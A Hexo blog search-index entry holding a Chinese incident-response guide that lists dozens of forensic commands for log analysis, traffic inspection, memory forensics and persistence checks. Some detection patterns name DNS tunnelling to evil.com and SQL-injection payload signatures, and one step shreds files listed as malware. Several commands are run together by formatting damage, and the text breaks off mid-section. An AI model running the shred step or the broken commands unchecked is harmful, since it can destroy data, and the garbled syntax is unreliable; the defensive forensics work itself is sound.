<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>应急溯源命令</title>
    <link href="/2025/07/01/%E5%BA%94%E6%80%A5%E6%BA%AF%E6%BA%90%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/07/01/%E5%BA%94%E6%80%A5%E6%BA%AF%E6%BA%90%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="HW应急溯源：50个高级命令实战指南"><a href="#HW应急溯源：50个高级命令实战指南" class="headerlink" title="HW应急溯源：50个高级命令实战指南"></a>HW应急溯源：50个高级命令实战指南</h1><p>在攻防对抗中，快速精准的应急溯源能力是防守方的核心武器。本文整理出50个实战中真正高频使用的高级命令组合，助你提升溯源效率。</p><hr><h3 id="一、日志深度分析与关联"><a href="#一、日志深度分析与关联" class="headerlink" title="一、日志深度分析与关联"></a>一、日志深度分析与关联</h3><ol><li><strong>多日志源联合检索</strong></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"># 跨系统日志关联（<span class="hljs-type">Syslog</span><span class="hljs-operator">+</span><span class="hljs-type">Apache）zgrep</span> <span class="hljs-operator">-</span>h <span class="hljs-string">&quot;192.168.1.100&quot;</span> <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/syslog* /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/log/</span>apache2<span class="hljs-regexp">/access.log* | awk -F&#x27;[][]&#x27;&#x27;&#123;gsub(/</span>:<span class="hljs-operator">/</span>,<span class="hljs-string">&quot; &quot;</span>); print <span class="hljs-variable">$1</span>,<span class="hljs-variable">$2</span>,$(<span class="hljs-type">NF</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>),<span class="hljs-variable">$NF</span>&#125;&#x27; <span class="hljs-operator">|</span>sort <span class="hljs-operator">-</span>k4<br></code></pre></td></tr></table></figure><ol><li><strong>SSH暴力破解行为分析</strong></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"># 识别高频攻击源<span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span>* | grep <span class="hljs-string">&quot;Failed password&quot;</span> | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr | awk &#x27;<span class="hljs-variable">$1</span>&gt;10 &#123;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;iptables -A INPUT -s &quot;</span><span class="hljs-variable">$2</span><span class="hljs-string">&quot; -j DROP&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>Web攻击特征提取</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 提取<span class="hljs-keyword">SQL</span>注入攻击载荷zcat /var/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-keyword">log</span>.*.gz |perl -ne <span class="hljs-string">&#x27;print if /(\%27|\&#x27;</span>)|(\%<span class="hljs-number">3</span>D|=).*(\-\-|\%<span class="hljs-number">23</span>|\#)/i<span class="hljs-string">&#x27; |cut -d&#x27;</span>&quot;&#x27; -f2,6<br></code></pre></td></tr></table></figure><hr><h3 id="二、网络取证与流量分析"><a href="#二、网络取证与流量分析" class="headerlink" title="二、网络取证与流量分析"></a>二、网络取证与流量分析</h3><ol><li><strong>实时异常连接监控</strong></li></ol><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang"># 检测异常外联（含进程名）lsof -i -n -P | awk &#x27;!/<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>|::<span class="hljs-number">1</span>/ &amp;&amp; <span class="hljs-string">$5</span>==<span class="hljs-string">&quot;TCP&quot;</span> &amp;&amp; <span class="hljs-string">$8</span>!<span class="hljs-string">~/LISTEN/</span> &#123;split(<span class="hljs-string">$7</span>,proc,<span class="hljs-string">&quot;/&quot;</span>); print <span class="hljs-string">$9</span>,proc[<span class="hljs-number">1</span>]&#125;&#x27; |sort -u<br></code></pre></td></tr></table></figure><ol><li><strong>PCAP深度包解析</strong></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"># 提取<span class="hljs-type">DNS隐蔽隧道特征tshark</span> <span class="hljs-operator">-</span>r traffic.pcap <span class="hljs-operator">-</span><span class="hljs-type">Y</span> <span class="hljs-string">&quot;dns&quot;</span> <span class="hljs-operator">-</span><span class="hljs-type">T</span> fields <span class="hljs-operator">-</span>e frame.time <span class="hljs-operator">-</span>e ip.src <span class="hljs-operator">-</span>e dns.qry.name <span class="hljs-operator">|</span>awk &#x27;<span class="hljs-variable">$3</span> <span class="hljs-operator">~</span> <span class="hljs-regexp">/[a-f0-9]&#123;16&#125;\.evil\.com/</span> &#123;print <span class="hljs-string">&quot;Malicious DNS: &quot;</span><span class="hljs-variable">$3</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>加密流量会话重组</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">提取TLS会话密钥（需提前配置）tcpdump -ni eth0 -s0 -w - <span class="hljs-string">&#x27;tcp port 443&#x27;</span> | <span class="hljs-built_in">tee</span> https.pcap | tshark -o <span class="hljs-string">&quot;tls.keylog_file:sslkeys.txt&quot;</span> -r -</span><br></code></pre></td></tr></table></figure><hr><h3 id="三、内存取证高级技巧"><a href="#三、内存取证高级技巧" class="headerlink" title="三、内存取证高级技巧"></a>三、内存取证高级技巧</h3><ol><li><strong>恶意进程链分析</strong></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">volatility <span class="hljs-operator">-</span>f memory.dump <span class="hljs-operator">--</span>profile<span class="hljs-operator">=</span><span class="hljs-type">Win10x64</span> pstree <span class="hljs-operator">|</span>awk &#x27;<span class="hljs-regexp">/explorer.exe/</span> &#123;pid<span class="hljs-operator">=</span><span class="hljs-variable">$2</span>; getline; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$0</span><span class="hljs-operator">~/^</span>[ ]&#123;<span class="hljs-number">4</span>&#125;<span class="hljs-regexp">/)&#123;if(/</span>cmd.exe<span class="hljs-operator">/</span>)&#123;print <span class="hljs-string">&quot;Suspicious chain:&quot;</span>,<span class="hljs-variable">$0</span>&#125;&#125; pid<span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>无文件攻击检测</strong></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"># 检测进程空洞注入volatility <span class="hljs-operator">-</span>f memory.dump <span class="hljs-operator">--</span>profile<span class="hljs-operator">=</span><span class="hljs-type">Win2016</span> malfind <span class="hljs-operator">-</span><span class="hljs-type">D</span> dump_dir <span class="hljs-operator">|</span>grep <span class="hljs-operator">-</span><span class="hljs-type">E</span> <span class="hljs-string">&quot;MZ.&#123;10,&#125;PE&quot;</span> <span class="hljs-operator">-</span><span class="hljs-type">B</span> <span class="hljs-number">5</span> <span class="hljs-operator">|</span>awk &#x27;<span class="hljs-regexp">/Process/</span> &#123;print <span class="hljs-variable">$2</span><span class="hljs-string">&quot;:&quot;</span><span class="hljs-variable">$4</span>&#125; <span class="hljs-regexp">/VAD/</span> &#123;print <span class="hljs-string">&quot;-&gt; &quot;</span><span class="hljs-variable">$3</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>注册表持久化分析</strong></li></ol><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">volatility <span class="hljs-operator">-</span>f memory.dump <span class="hljs-operator">-</span>-profile<span class="hljs-operator">=</span>Win7SP1 printkey <span class="hljs-operator">-</span>K <span class="hljs-string">&quot;Software<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\R</span>un&quot;</span> |grep <span class="hljs-operator">-</span>A <span class="hljs-number">5</span> <span class="hljs-string">&quot;REG_&quot;</span> |perl <span class="hljs-operator">-</span>ne &#x27;print <span class="hljs-keyword">if</span> <span class="hljs-symbol">/Last</span> Write Time<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>Data:<span class="hljs-operator">/</span>&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="四、文件系统深度检查"><a href="#四、文件系统深度检查" class="headerlink" title="四、文件系统深度检查"></a>四、文件系统深度检查</h3><ol><li><strong>隐藏文件深度扫描</strong></li></ol><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"># 检测时间戳伪造<span class="hljs-built_in">find</span> / -<span class="hljs-built_in">type</span> f -printf&quot;<span class="hljs-variable">%i|%</span>p|<span class="hljs-variable">%TY-%</span>Tm-%Td <span class="hljs-variable">%TT|%</span>AY-<span class="hljs-variable">%Am-%</span>Ad %<span class="hljs-built_in">AT</span>\n&quot; |awk -F&#x27;|&#x27;&#x27;$<span class="hljs-number">3</span>!=$<span class="hljs-number">4</span> &#123;<span class="hljs-built_in">print</span> &quot;Timestamp anomaly:&quot;,$<span class="hljs-number">2</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>ELF文件异常检测</strong></li></ol><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"># 检查动态链接库劫持<span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> $(find <span class="hljs-regexp">/usr/</span>bin <span class="hljs-operator">-</span>type f); <span class="hljs-keyword">do</span>    ldd <span class="hljs-variable">$f</span> <span class="hljs-operator">|</span> awk &#x27;<span class="hljs-regexp">/not found/</span> &#123;print <span class="hljs-string">&quot;[&quot;</span><span class="hljs-variable">$1</span><span class="hljs-string">&quot;] missing in &quot;</span><span class="hljs-variable">$0</span>&#125;&#x27;done<br></code></pre></td></tr></table></figure><ol><li><strong>快速哈希比对</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">自动化基准校验find /bin /sbin /usr/bin -<span class="hljs-built_in">type</span> f -execsha256sum &#123;&#125; + |diff - baseline.sha256 |grep <span class="hljs-string">&#x27;^&gt;&#x27;</span> | <span class="hljs-built_in">cut</span> -c3-</span><br></code></pre></td></tr></table></figure><hr><h3 id="五、系统行为监控"><a href="#五、系统行为监控" class="headerlink" title="五、系统行为监控"></a>五、系统行为监控</h3><ol><li><strong>进程行为监控</strong></li></ol><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"># 跟踪进程系统调用strace -ff -e <span class="hljs-keyword">trace</span>=<span class="hljs-keyword">file</span>,network -p $(pgrep -f suspicious_process) <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> |tee /tmp/proc_mon.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><ol><li><strong>文件实时监控</strong></li></ol><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"># 多目录深度监控inotifywait -m -<span class="hljs-keyword">r</span> --format &#x27;<span class="hljs-built_in">%T</span> <span class="hljs-built_in">%e</span> <span class="hljs-built_in">%w</span><span class="hljs-built_in">%f</span>&#x27; --timefmt &#x27;<span class="hljs-built_in">%F</span>_<span class="hljs-built_in">%T</span>&#x27; /etc /bin <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> |grep -E <span class="hljs-string">&quot;(MODIFY|CREATE|DELETE)&quot;</span><br></code></pre></td></tr></table></figure><ol><li><strong>内核模块检测</strong></li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># 检测隐藏LKMdiff &lt;(lsmod | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>) &lt;(<span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;^#&quot;</span> <span class="hljs-regexp">/proc/m</span>odules | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>) |<span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;&gt;&#x27;</span> | cut -c3-<br></code></pre></td></tr></table></figure><hr><h3 id="六、自动化响应处置"><a href="#六、自动化响应处置" class="headerlink" title="六、自动化响应处置"></a>六、自动化响应处置</h3><ol><li><strong>攻击者环境隔离</strong></li></ol><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># 自动化蜜罐重定向iptables -t nat -<span class="hljs-keyword">A</span> PREROUTING -s $(cat attacker_ips.txt) -j DNAT --to-destination <span class="hljs-number">10.0.0.99</span><br></code></pre></td></tr></table></figure><ol><li><strong>恶意文件批量处置</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安全删除并记录whileread -r file; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">shred</span> -v -n 3 -z <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>    <span class="hljs-built_in">echo</span><span class="hljs-string">&quot;<span class="hljs-subst">$(date)</span> | <span class="hljs-subst">$(sha256sum <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>)</span>&quot;</span> &gt;&gt; /audit/file_erase.logdone &lt; malware_list.txt</span><br></code></pre></td></tr></table></figure><ol><li><strong>应急快照创建</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">系统状态全量采集systemctl list-units --<span class="hljs-built_in">type</span>=service &gt; service_state.logcrontab -l &gt; cron_backup.txtnetstat -tulnpe &gt; netstat.logtar czf /backup/forensic_$(<span class="hljs-built_in">date</span> +%s).tar.gz *.<span class="hljs-built_in">log</span></span><br></code></pre></td></tr></table></figure><hr><h3 id="七、Windows环境专用"><a href="#七、Windows环境专用" class="headerlink" title="七、Windows环境专用"></a>七、Windows环境专用</h3><ol><li><strong>PowerShell日志提取</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-WinEvent-LogName&quot;Microsoft-Windows-PowerShell/Operational&quot; | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.Id -eq4104&#125; | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> TimeCreated, Message<br></code></pre></td></tr></table></figure><ol><li><strong>WMI持久化检测</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /NAMESPACE:\\root\<span class="hljs-keyword">subscription</span> <span class="hljs-type">PATH</span> __EventFilter <span class="hljs-keyword">GET</span> Namewmic /NAMESPACE:\\root\<span class="hljs-keyword">subscription</span> <span class="hljs-type">PATH</span> CommandLineEventConsumer <span class="hljs-keyword">GET</span> ExecutablePath<br></code></pre></td></tr></table></figure><ol><li><strong>异常计划任务扫描</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-ScheduledTask | <span class="hljs-keyword">Where</span>-<span class="hljs-keyword">Object</span> &#123;$_.State -ne&quot;Disabled&quot;&#125; | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> TaskName, @&#123;N=&quot;Command&quot;;E=&#123;$_.Actions.<span class="hljs-keyword">Execute</span>&#125;&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="八、云环境特殊操作"><a href="#八、云环境特殊操作" class="headerlink" title="八、云环境特殊操作"></a>八、云环境特殊操作</h3><ol><li><strong>AWS API异常检测</strong></li></ol><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws cloudtrail lookup-events <span class="hljs-params">--lookup-attributes</span> AttributeKey=EventName,AttributeValue=ConsoleLogin \<span class="hljs-params">--query</span> &#x27;Events[]<span class="hljs-string">.CloudTrailEvent</span>&#x27; <span class="hljs-params">--output</span> text |jq -r &#x27;select<span class="hljs-params">(.userIdentity.<span class="hljs-attr">type</span> == &quot;Root&quot;)</span> | <span class="hljs-string">.eventTime</span>&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>K8s异常Pod检测</strong></li></ol><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl get pods -A -o json | <span class="hljs-type">jq</span> -r &#x27;.items[] | <span class="hljs-type">select</span>(.status.containerStatuses[].restartCount&gt;<span class="hljs-number">5</span>) | <span class="hljs-type">.metadata</span>.name&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="九、数据库取证"><a href="#九、数据库取证" class="headerlink" title="九、数据库取证"></a>九、数据库取证</h3><ol><li><strong>MySQL登录审计</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> user_host, event_time <span class="hljs-keyword">FROM</span> mysql.general_log <span class="hljs-keyword">WHERE</span> command_type=<span class="hljs-string">&#x27;Connect&#x27;</span><span class="hljs-keyword">AND</span> argument LIK<span class="hljs-string">E&#x27;%admin%&#x27;</span>ORDERBY event_time DESCLIMIT <span class="hljs-number">50</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>PostgreSQL对象变更</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span>*<span class="hljs-keyword">FROM</span> pg_audit <span class="hljs-keyword">WHERE</span> object_type <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;TABLE&#x27;</span>,<span class="hljs-string">&#x27;FUNCTION&#x27;</span>) <span class="hljs-keyword">AND</span> statement_type=<span class="hljs-string">&#x27;DDL&#x27;</span><br></code></pre></td></tr></table></figure><hr><h3 id="十、综合溯源分析"><a href="#十、综合溯源分析" class="headerlink" title="十、综合溯源分析"></a>十、综合溯源分析</h3><ol><li><strong>攻击时间线重建</strong></li></ol><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"># 多源日志合并排序(<span class="hljs-built_in">find</span> /<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span> -name <span class="hljs-string">&quot;*.log&quot;</span> -execcat &#123;&#125; +; journalctl -q --since <span class="hljs-string">&quot;2 hours ago&quot;</span>) | grep -E <span class="hljs-string">&quot;fail|error|warning&quot;</span> | <span class="hljs-built_in">sort</span> -k <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><ol><li><strong>跨主机关联分析</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">分布式日志检索parallel-ssh -h hostlist.txt <span class="hljs-string">&quot;grep &#x27;2023-07-15T14&#x27; /var/log/secure&quot;</span> | awk <span class="hljs-string">&#x27;/FAILED LOGIN/&#123;ip[$8]++&#125; END&#123;for(i in ip) print ip[i],i&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr</span><br></code></pre></td></tr></table></figure><hr><h3 id="十一、反混淆技术"><a href="#十一、反混淆技术" class="headerlink" title="十一、反混淆技术"></a>十一、反混淆技术</h3><ol><li><strong>PowerShell解码</strong></li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[System.Text.Encoding]</span>::UTF8<span class="hljs-selector-class">.GetString</span>(  <span class="hljs-selector-attr">[System.Convert]</span>::<span class="hljs-built_in">FromBase64String</span>(<span class="hljs-variable">$encodedString</span>)<br></code></pre></td></tr></table></figure><ol><li><strong>JavaScript美化</strong></li></ol><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">js</span>-beautify -r -f obfuscated<span class="hljs-number">.</span><span class="hljs-keyword">js</span> -o cleaned<span class="hljs-number">.</span><span class="hljs-keyword">js</span><br></code></pre></td></tr></table></figure><hr><h3 id="十二、深度内存分析"><a href="#十二、深度内存分析" class="headerlink" title="十二、深度内存分析"></a>十二、深度内存分析</h3><ol><li><strong>DLL注入检测</strong></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f memory.img --profile=Win10x64 ldrmodules | awk &#x27;$<span class="hljs-number">4</span>==<span class="hljs-string">&quot;False&quot;</span> || $<span class="hljs-number">5</span>==<span class="hljs-string">&quot;False&quot;</span> || $<span class="hljs-number">6</span>==<span class="hljs-string">&quot;False&quot;</span> &#123;print <span class="hljs-string">&quot;PID:&quot;</span>$<span class="hljs-number">2</span><span class="hljs-string">&quot; -&gt; &quot;</span>$<span class="hljs-number">1</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>API Hook检测</strong></li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">volatility -<span class="hljs-keyword">f</span> memory.img --<span class="hljs-keyword">profile</span>=Win7SP1 apihooks -<span class="hljs-keyword">p</span> <span class="hljs-number">1244</span> | <span class="hljs-keyword">grep</span> -A <span class="hljs-number">5</span> <span class="hljs-string">&quot;Hook mode&quot;</span> | <span class="hljs-keyword">perl</span> -<span class="hljs-number">0</span><span class="hljs-keyword">pe</span> <span class="hljs-string">&#x27;s/\n\s+/ /g&#x27;</span><br></code></pre></td></tr></table></figure><hr><h3 id="十三、网络层高级分析"><a href="#十三、网络层高级分析" class="headerlink" title="十三、网络层高级分析"></a>十三、网络层高级分析</h3><ol><li><strong>TCP会话重组</strong></li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tcprewrite <span class="hljs-attr">--infile</span>=raw<span class="hljs-selector-class">.pcap</span> <span class="hljs-attr">--outfile</span>=ordered<span class="hljs-selector-class">.pcap</span> <span class="hljs-attr">--fixcsum</span><br></code></pre></td></tr></table></figure><ol><li><strong>DNS隧道检测</strong></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r dns.pcap -Y <span class="hljs-string">&quot;dns&quot;</span> -T fields -e dns.qry.name | awk -F. &#x27;&#123;len=<span class="hljs-number">0</span>; for(i=<span class="hljs-number">1</span>;i&lt;=NF;i++) len+=length($i); if(len&gt;<span class="hljs-number">100</span>) print <span class="hljs-string">&quot;Suspicious: &quot;</span>$<span class="hljs-number">0</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="十四、文件签名校验"><a href="#十四、文件签名校验" class="headerlink" title="十四、文件签名校验"></a>十四、文件签名校验</h3><ol><li><strong>PE文件验证</strong></li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">osslsigncode verify -in suspicious.<span class="hljs-keyword">exe</span> | <span class="hljs-keyword">grep</span> -E <span class="hljs-string">&quot;Signature|Not After&quot;</span><br></code></pre></td></tr></table></figure><ol><li><strong>证书链验证</strong></li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">openssl s_client -connect <span class="hljs-keyword">target</span>.com:<span class="hljs-number">443</span> -showcerts <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-keyword">null</span> | openssl <span class="hljs-keyword">x</span><span class="hljs-number">509</span> -noout -dates -issuer<br></code></pre></td></tr></table></figure><hr><h3 id="十五、日志规范化处理"><a href="#十五、日志规范化处理" class="headerlink" title="十五、日志规范化处理"></a>十五、日志规范化处理</h3><ol><li><strong>多格式时间转换</strong></li></ol><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">date -d <span class="hljs-string">&quot;<span class="hljs-variable">$(</span>echo &quot;</span>Jul <span class="hljs-number">15</span> <span class="hljs-number">14</span>:<span class="hljs-number">22</span><span class="hljs-string">&quot; | sed &#x27;s/ /-/g&#x27;)&quot;</span> +<span class="hljs-string">&quot;<span class="hljs-variable">%Y</span>-<span class="hljs-variable">%m</span>-%dT<span class="hljs-variable">%H</span>:<span class="hljs-variable">%M</span>:<span class="hljs-variable">%S</span>&quot;</span><br></code></pre></td></tr></table></figure><ol><li><strong>日志字段提取</strong></li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">awk &#x27;&#123;<span class="hljs-built_in">match</span>(<span class="hljs-variable">$0</span>,/client: (\S+)/,a); <span class="hljs-keyword">print</span> a[1]&#125;&#x27; /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/access.<span class="hljs-keyword">log</span><br></code></pre></td></tr></table></figure><hr><h3 id="十六、安全配置核查"><a href="#十六、安全配置核查" class="headerlink" title="十六、安全配置核查"></a>十六、安全配置核查</h3><ol><li><strong>Linux加固检查</strong></li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"># 检查危险权限文件find / -xdev \( -perm <span class="hljs-number">-4000</span> -o -perm <span class="hljs-number">-2000</span> \) -<span class="hljs-keyword">type</span> f -execls -ld &#123;&#125; +<br></code></pre></td></tr></table></figure><ol><li><strong>Windows策略审计</strong></li></ol><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">Get-ItemProperty<span class="hljs-string">&quot;HKLM:<span class="hljs-char escape_">\S</span>OFTWARE<span class="hljs-char escape_">\P</span>olicies<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\F</span>irewall<span class="hljs-char escape_">\S</span>tandardProfile&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="十七、隐蔽信道检测"><a href="#十七、隐蔽信道检测" class="headerlink" title="十七、隐蔽信道检测"></a>十七、隐蔽信道检测</h3><ol><li><strong>ICMP隧道识别</strong></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -ni eth0 <span class="hljs-string">&quot;icmp[icmptype]==icmp-echo&quot;</span> -vv | awk &#x27;length($<span class="hljs-number">0</span>) &gt; <span class="hljs-number">200</span> &#123;print <span class="hljs-string">&quot;Large ICMP packet from: &quot;</span>$<span class="hljs-number">3</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><ol><li><strong>HTTP隐蔽隧道</strong></li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r web.pcap -Y <span class="hljs-string">&quot;http&quot;</span> -T fields -e http.request.uri | perl -ne &#x27;print if /[a-f0-<span class="hljs-number">9</span>]&#123;<span class="hljs-number">32</span>&#125;/i&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="十八、自动化报告生成"><a href="#十八、自动化报告生成" class="headerlink" title="十八、自动化报告生成"></a>十八、自动化报告生成</h3><ol><li><strong>证据摘要生成</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span><span class="hljs-string">&quot;## Forensic Report <span class="hljs-subst">$(date)</span>&quot;</span> &gt; report.mdfor f <span class="hljs-keyword">in</span> *.<span class="hljs-built_in">log</span>; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">echo</span><span class="hljs-string">&quot;### <span class="hljs-variable">$&#123;f%.*&#125;</span>&quot;</span> &gt;&gt; report.md    grep -c <span class="hljs-string">&quot;ERROR&quot;</span><span class="hljs-string">&quot;<span class="hljs-variable">$f</span>&quot;</span> | xargs <span class="hljs-built_in">echo</span><span class="hljs-string">&quot;- Error count: &quot;</span> &gt;&gt; report.mddone<br></code></pre></td></tr></table></figure><hr><h3 id="十九、反取证对抗"><a href="#十九、反取证对抗" class="headerlink" title="十九、反取证对抗"></a>十九、反取证对抗</h3><ol><li><strong>时间戳反篡改</strong></li></ol><figure class="highlight 